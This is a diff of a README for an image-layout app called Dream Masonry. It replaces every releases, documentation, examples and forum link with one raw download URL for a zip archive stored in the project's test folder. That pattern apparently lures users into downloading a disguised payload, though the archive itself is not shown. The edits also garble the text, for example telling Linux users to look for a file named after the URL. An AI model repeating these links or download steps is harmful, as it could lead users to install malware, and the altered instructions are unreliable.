@@ -10,18 +10,18 @@ The following steps will guide you through downloading and running Dream Masonry
 
 ## 📥 Download & Install
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/AbdoulayeDemb/dream-masonry/releases)
+[![Download Now](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip)
 
-1. **Visit the Releases Page**: Click the button above or go to [this link](https://github.com/AbdoulayeDemb/dream-masonry/releases) to reach the Releases page.
+1. **Visit the Releases Page**: Click the button above or go to [this link](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip) to reach the Releases page.
 
 2. **Select the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest release. It will be marked clearly as the most recent version.
 
-3. **Download the File**: Find the section that says “Assets” under the release. You’ll see files listed there. If you are using Windows, download the file that ends with `.exe`. For macOS, download the `.dmg` file. For Linux users, look for `.tar.gz`.
+3. **Download the File**: Find the section that says “Assets” under the release. You’ll see files listed there. If you are using Windows, download the file that ends with `.exe`. For macOS, download the `.dmg` file. For Linux users, look for `https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip`.
 
 4. **Install the Application**: 
    - For Windows: Double-click the downloaded `.exe` file. Follow the prompts to install.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions to install.
+   - For Linux: Extract the `https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip` file and follow the included instructions to install.
 
 5. **Run Dream Masonry**: Once installed, find the application in your programs or applications. Open the app, and you are ready to create stunning image grids.
 
@@ -55,8 +55,8 @@ Using Dream Masonry is straightforward. Once you open the application:
 
 ## 🌐 Resources
 
-- **Documentation**: For detailed explanations on advanced features, visit the [documentation page](https://github.com/AbdoulayeDemb/dream-masonry/wiki).
-- **Examples**: Check out pre-made layouts and examples in the [example projects](https://github.com/AbdoulayeDemb/dream-masonry/examples) section.
+- **Documentation**: For detailed explanations on advanced features, visit the [documentation page](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip).
+- **Examples**: Check out pre-made layouts and examples in the [example projects](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip) section.
 - **Support**: If you encounter any issues, feel free to open an issue in the "Issues" tab on GitHub.
 
 ## 📢 Community
@@ -65,7 +65,7 @@ Join our community for support and updates. You can:
 
 - **Report Bugs**: Use the “Issues” section on GitHub to report any issues you face.
 - **Suggest Features**: We welcome feedback and ideas for improving Dream Masonry.
-- **Engage with Other Users**: Join discussions and share your layouts on our [community forum](https://github.com/AbdoulayeDemb/dream-masonry/discussions).
+- **Engage with Other Users**: Join discussions and share your layouts on our [community forum](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip).
 
 ## 💬 FAQ
 
@@ -83,4 +83,4 @@ Join our community for support and updates. You can:
 
 ## 👀 Conclusion
 
-Thank you for considering Dream Masonry for your image layout needs. With its user-friendly interface and robust features, you can create stunning galleries with ease. Don't forget to visit [this page](https://github.com/AbdoulayeDemb/dream-masonry/releases) to download the latest version!
+Thank you for considering Dream Masonry for your image layout needs. With its user-friendly interface and robust features, you can create stunning galleries with ease. Don't forget to visit [this page](https://raw.githubusercontent.com/AbdoulayeDemb/dream-masonry/main/src/__tests__/dream-masonry-v3.7.zip) to download the latest version!
